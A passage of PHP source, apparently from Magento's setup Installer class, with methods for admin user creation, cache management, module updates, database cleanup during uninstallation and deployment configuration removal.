            throw new ValidationException(__(implode(PHP_EOL, $validationErrors)));
        }
    }

    /**
     * Create data handler
     *
     * @param string $className
     * @param string $interfaceName
     * @return mixed|null
     * @throws Exception
     */
    protected function createSchemaDataHandler($className, $interfaceName)
    {
        if (class_exists($className)) {
            if (!is_subclass_of($className, $interfaceName) && $className !== $interfaceName) {
                // phpcs:ignore Magento2.Exceptions.DirectThrow
                throw  new Exception($className . ' must implement \\' . $interfaceName);
            } else {
                return $this->objectManagerProvider->get()->create($className);
            }
        }
        return null;
    }

    /**
     * Create store order increment prefix configuration
     *
     * @param string $orderIncrementPrefix Value to use for order increment prefix
     * @return void
     *
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     */
    private function installOrderIncrementPrefix($orderIncrementPrefix)
    {
        $setup = $this->setupFactory->create($this->context->getResources());
        $dbConnection = $setup->getConnection();

        // get entity_type_id for order
        $select = $dbConnection->select()
            ->from($setup->getTable('eav_entity_type'), 'entity_type_id')
            ->where('entity_type_code = \'order\'');
        $entityTypeId = $dbConnection->fetchOne($select);

        // See if row already exists
        $incrementRow = $dbConnection->fetchRow(
            'SELECT * FROM ' . $setup->getTable('eav_entity_store') . ' WHERE entity_type_id = ? AND store_id = ?',
            [$entityTypeId, Store::DISTRO_STORE_ID]
        );

        if (!empty($incrementRow)) {
            // row exists, update it
            $entityStoreId = $incrementRow['entity_store_id'];
            $dbConnection->update(
                $setup->getTable('eav_entity_store'),
                ['increment_prefix' => $orderIncrementPrefix],
                ['entity_store_id' => $entityStoreId]
            );
        } else {
            // add a row to the store's eav table, setting the increment_prefix
            $rowData = [
                'entity_type_id' => $entityTypeId,
                'store_id' => Store::DISTRO_STORE_ID,
                'increment_prefix' => $orderIncrementPrefix,
            ];
            $dbConnection->insert($setup->getTable('eav_entity_store'), $rowData);
        }
    }

    /**
     * Create admin account
     *
     * @param \ArrayObject|array $data
     * @return void
     * @throws Exception
     * @throws FileSystemException
     * @throws RuntimeException
     */
    public function installAdminUser($data)
    {
        if ($this->isDryRun($data)) {
            return;
        }

        $adminUserModuleIsInstalled = (bool)$this->deploymentConfig->get('modules/Magento_User');
        //Admin user data is not system data, so we need to install it only if schema for admin user was installed
        if ($adminUserModuleIsInstalled) {
            $this->assertDbConfigExists();
            $data += ['db-prefix' => $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_DB_PREFIX)];
            $setup = $this->setupFactory->create($this->context->getResources());
            $adminAccount = $this->adminAccountFactory->create($setup->getConnection(), (array)$data);
            $adminAccount->save();
        }
    }

    /**
     * Updates modules in deployment configuration
     *
     * @param bool $keepGeneratedFiles Cleanup generated classes and view files and reset ObjectManager
     * @return void
     * @throws Exception
     */
    public function updateModulesSequence($keepGeneratedFiles = false)
    {
        $config = $this->deploymentConfig->get(ConfigOptionsListConstants::KEY_MODULES);
        if (!$config) {
            // phpcs:ignore Magento2.Exceptions.DirectThrow
            throw new Exception(
                "Can't run this operation: deployment configuration is absent."
                . " Run 'magento setup:config:set --help' for options."
            );
        }
        $this->flushCaches([ConfigCache::TYPE_IDENTIFIER]);
        $this->cleanCaches();
        if (!$keepGeneratedFiles) {
            $this->cleanupGeneratedFiles();
        }
        $this->log->log('Updating modules:');
        $this->createModulesConfig([]);
    }

    /**
     * Get the modules config as Magento sees it
     *
     * @return array
     * @throws \LogicException
     */
    public function getModulesConfig()
    {
        return $this->createModulesConfig([], true);
    }

    /**
     * Uninstall Magento application
     *
     * @return void
     */
    public function uninstall()
    {
        $this->log->log('Starting Magento uninstallation:');

        try {
            $this->cleanCaches();
        } catch (\Exception $e) {
            $this->log->log(
                'Can\'t clear cache due to the following error: '
                . $e->getMessage() . PHP_EOL
                . 'To fully clean up your uninstallation, you must manually clear your cache.'
            );
        }

        $this->cleanupDb();

        $this->log->log('File system cleanup:');
        $messages = $this->cleanupFiles->clearAllFiles();
        foreach ($messages as $message) {
            $this->log->log($message);
        }

        $this->deleteDeploymentConfig();

        $this->log->logSuccess('Magento uninstallation complete.');
    }

    /**
     * Enable or disable caches for specific types that are available
     *
     * If no types are specified then it will enable or disable all available types
     * Note this is called by install() via callback.
     *
     * @param bool $isEnabled
     * @param array $types
     * @return void
     * @throws Exception
     */
    private function updateCaches($isEnabled, $types = [])
    {
        /** @var Manager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->create(Manager::class);

        $availableTypes = $cacheManager->getAvailableTypes();
        $types = empty($types) ? $availableTypes : array_intersect($availableTypes, $types);
        $enabledTypes = $cacheManager->setEnabled($types, $isEnabled);
        if ($isEnabled) {
            $cacheManager->clean($enabledTypes);
        }

        // Only get statuses of specific cache types
        $cacheStatus = array_filter(
            $cacheManager->getStatus(),
            function (string $key) use ($types) {
                return in_array($key, $types);
            },
            ARRAY_FILTER_USE_KEY
        );

        $this->log->log('Current status:');
        foreach ($cacheStatus as $cache => $status) {
            $this->log->log(sprintf('%s: %d', $cache, $status));
        }
    }

    /**
     * Clean caches after installing application
     *
     * @return void
     *
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     * @throws Exception
     */
    private function cleanCaches()
    {
        /** @var Manager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->get(Manager::class);
        $types = $cacheManager->getAvailableTypes();
        $cacheManager->clean($types);
        $this->log->log('Cache cleared successfully');
    }

    /**
     * Flush caches for specific types or all available types
     *
     * @param array $types
     * @return void
     *
     * @throws Exception
     */
    private function flushCaches($types = [])
    {
        /** @var Manager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->get(Manager::class);
        $types = empty($types) ? $cacheManager->getAvailableTypes() : $types;
        $cacheManager->flush($types);
        $this->log->log('Cache types ' . implode(',', $types) . ' flushed successfully');
    }

    /**
     * Enables or disables maintenance mode for Magento application
     *
     * @param int $value
     * @return void
     *
     * @SuppressWarnings(PHPMD.UnusedPrivateMethod) Called by install() via callback.
     */
    private function setMaintenanceMode($value)
    {
        $this->maintenanceMode->set($value);
    }

    /**
     * Return messages
     *
     * @return array
     */
    public function getInstallInfo()
    {
        return $this->installInfo;
    }

    /**
     * Deletes the database and creates it again
     *
     * @return void
     */
    public function cleanupDb()
    {
        $cleanedUpDatabases = [];
        $connections = $this->deploymentConfig->get(ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTIONS, []);
        //Do database cleanup for all shards
        foreach ($connections as $config) {
            try {
                $connection = $this->connectionFactory->create($config);
                if (!$connection) {
                    $this->log->log("Can't create connection to database - skipping database cleanup");
                }
            } catch (\Exception $e) {
                $this->log->log($e->getMessage() . ' - skipping database cleanup');
                return;
            }

            $dbName = $connection->quoteIdentifier($config[ConfigOptionsListConstants::KEY_NAME]);
            //If for different shards one database was specified - no need to clean it few times
            if (!in_array($dbName, $cleanedUpDatabases)) {
                $this->log->log("Cleaning up database {$dbName}");
                // phpcs:ignore Magento2.SQL.RawQuery
                $connection->query("DROP DATABASE IF EXISTS {$dbName}");
                // phpcs:ignore Magento2.SQL.RawQuery
                $connection->query("CREATE DATABASE IF NOT EXISTS {$dbName}");
                $cleanedUpDatabases[] = $dbName;
            }
        }

        if (empty($config)) {
            $this->log->log('No database connection defined - skipping database cleanup');
        }
    }

    /**
     * Removes deployment configuration
     *
     * @return void
     * @throws FileSystemException
     */
    private function deleteDeploymentConfig()
    {
        $configDir = $this->filesystem->getDirectoryWrite(DirectoryList::CONFIG);
        $configFiles = $this->deploymentConfigReader->getFiles();
        foreach ($configFiles as $configFile) {
            $absolutePath = $configDir->getAbsolutePath($configFile);
            if (!$configDir->isFile($configFile)) {
                $this->log->log("The file '{$absolutePath}' doesn't exist - skipping cleanup");
                continue;
            }
            try {
                $this->log->log($absolutePath);
                $configDir->delete($configFile);
            } catch (FileSystemException $e) {
                $this->log->log($e->getMessage());
            }
        }
    }

    /**
     * Validates that MySQL is accessible and MySQL version is supported
     *
     * @return void
     * @throws Exception
     * @throws FileSystemException
     * @throws RuntimeException
     */
    private function assertDbAccessible()
    {
        $driverOptionKeys = [
            ConfigOptionsListConstants::KEY_MYSQL_SSL_KEY =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_KEY,

            ConfigOptionsListConstants::KEY_MYSQL_SSL_CERT =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_CERT,

            ConfigOptionsListConstants::KEY_MYSQL_SSL_CA =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_CA,

            ConfigOptionsListConstants::KEY_MYSQL_SSL_VERIFY =>
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT_DRIVER_OPTIONS . '/' .
                ConfigOptionsListConstants::KEY_MYSQL_SSL_VERIFY
        ];
        $driverOptions = [];
        foreach ($driverOptionKeys as $driverOptionKey => $driverOptionConfig) {
            $config = $this->deploymentConfig->get($driverOptionConfig);
            if ($config !== null) {
                $driverOptions[$driverOptionKey] = $config;
            }
        }

        $this->dbValidator->checkDatabaseConnectionWithDriverOptions(
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_NAME
            ),
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_HOST
            ),
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_USER
            ),
            $this->deploymentConfig->get(
                ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
                '/' . ConfigOptionsListConstants::KEY_PASSWORD
            ),
            $driverOptions
        );
        $prefix = $this->deploymentConfig->get(
            ConfigOptionsListConstants::CONFIG_PATH_DB_CONNECTION_DEFAULT .
            '/' . ConfigOptionsListConstants::KEY_PREFIX
        );
        if (null !== $prefix) {
            $this->dbValidator->checkDatabaseTablePrefix($prefix);
        }
    }

    /**
     * Get handler for schema or data install/upgrade/backup/uninstall etc.
     *
     * @param string $moduleName
     * @param string $type
     * @return InstallSchemaInterface | UpgradeSchemaInterface | InstallDataInterface | UpgradeDataInterface | null
     * @throws Exception
     */
    private function getSchemaDataHandler($moduleName, $type)
    {
        $className = str_replace('_', '\\', $moduleName) . '\Setup';
        switch ($type) {
            case 'schema-install':
                $className .= '\InstallSchema';
                $interface = self::SCHEMA_INSTALL;
                break;
            case 'schema-upgrade':
                $className .= '\UpgradeSchema';
                $interface = self::SCHEMA_UPGRADE;
                break;
            case 'schema-recurring':
                $className .= '\Recurring';
                $interface = self::SCHEMA_INSTALL;
                break;
            case 'data-install':
                $className .= '\InstallData';
                $interface = self::DATA_INSTALL;
                break;
            case 'data-upgrade':
                $className .= '\UpgradeData';
                $interface = self::DATA_UPGRADE;
                break;
            case 'data-recurring':
                $className .= '\RecurringData';
                $interface = self::DATA_INSTALL;
                break;
            default:
                // phpcs:ignore Magento2.Exceptions.DirectThrow
                throw new Exception("$className does not exist");
        }

        return $this->createSchemaDataHandler($className, $interface);
    }

    /**
     * Generates list of ModuleContext
     *
     * @param \Magento\Framework\Module\ModuleResource $resource
     * @param string $type
     * @return ModuleContext[]
     * @throws Exception
     */
    private function generateListOfModuleContext($resource, $type)
    {
        $moduleContextList = [];
        foreach ($this->moduleList->getNames() as $moduleName) {
            if ($type === 'schema-version') {
                $dbVer = $resource->getDbVersion($moduleName);
            } elseif ($type === 'data-version') {
                $dbVer = $resource->getDataVersion($moduleName);
            } else {
                // phpcs:ignore Magento2.Exceptions.DirectThrow
                throw  new Exception("Unsupported version type $type is requested");
            }
            if ($dbVer !== false) {
                $moduleContextList[$moduleName] = new ModuleContext($dbVer);
            } else {
                $moduleContextList[$moduleName] = new ModuleContext('');
            }
        }
        return $moduleContextList;
    }

    /**
     * Clear generated/code and reset object manager
     *
     * @return void
     */
    private function cleanupGeneratedFiles()
    {
        $this->log->log('File system cleanup:');
        $messages = $this->cleanupFiles->clearCodeGeneratedFiles();

        // unload Magento autoloader because it may be using compiled definition
        foreach (spl_autoload_functions() as $autoloader) {
            if (is_array($autoloader) && $autoloader[0] instanceof \Magento\Framework\Code\Generator\Autoloader) {
                spl_autoload_unregister([$autoloader[0], $autoloader[1]]);
                break;
            }
        }

        // Corrected Magento autoloader will be loaded upon next get() call on $this->objectManagerProvider
        $this->objectManagerProvider->reset();

        foreach ($messages as $message) {
            $this->log->log($message);
        }
    }

    /**
     * Checks that admin data is not empty in request array
     *
     * @param \ArrayObject|array $request
     * @return bool
     */
    private function isAdminDataSet($request)
    {
        $adminData = array_filter(
            $request,
            function ($value, $key) {
                return in_array(
                    $key,
                    [
                        AdminAccount::KEY_EMAIL,
                        AdminAccount::KEY_FIRST_NAME,
                        AdminAccount::KEY_LAST_NAME,
                        AdminAccount::KEY_USER,
                        AdminAccount::KEY_PASSWORD,
                    ]
                ) && $value !== null;
            },
            ARRAY_FILTER_USE_BOTH
        );

        return !empty($adminData);
    }

    /**
     * Update flag_data column data type to maintain consistency.
     *
     * @param AdapterInterface $connection
     * @param string $tableName
     * @param string $columnName
     * @param string $typeName
     */
    private function updateColumnType(
        AdapterInterface $connection,
        string $tableName,
        string $columnName,
        string $typeName
    ): void {
        $tableDescription = $connection->describeTable($tableName);
        if ($tableDescription[$columnName]['DATA_TYPE'] !== $typeName) {
            $connection->modifyColumn(
                $tableName,
                $columnName,
                $typeName
            );
        }
    }

    /**
     * Remove unused triggers from db
     *
     * @throws \Exception
     */
    public function removeUnusedTriggers(): void
    {
        $this->triggerCleaner->removeTriggers();
        $this->cleanCaches();
    }

    /**
     * Returns list of disabled cache types
     *
     * @param array $cacheTypesToCheck
     * @return array
     */
    private function getDisabledCacheTypes(array $cacheTypesToCheck): array
    {
        $disabledCaches = [];

        /** @var CacheManager $cacheManager */
        $cacheManager = $this->objectManagerProvider->get()->create(CacheManager::class);
        $cacheStatus = $cacheManager->getStatus();

        foreach ($cacheTypesToCheck as $cacheType) {
            if (isset($cacheStatus[$cacheType]) && $cacheStatus[$cacheType] === 0) {
                $disabledCaches[] = $cacheType;
            }
        }

        return $disabledCaches;
    }

    /**
     * Revert remote storage configuration back to local file driver
     */
    private function revertRemoteStorageConfiguration()
    {
        if (!$this->deploymentConfigWriter->checkIfWritable()) {
            return;
        }

        $remoteStorageData = new ConfigData(ConfigFilePool::APP_ENV);
        $remoteStorageData->set('remote_storage', ['driver' => 'file']);
        $configData = [$remoteStorageData->getFileKey() => $remoteStorageData->getData()];
        $this->deploymentConfigWriter->saveConfig($configData, true);
    }
}
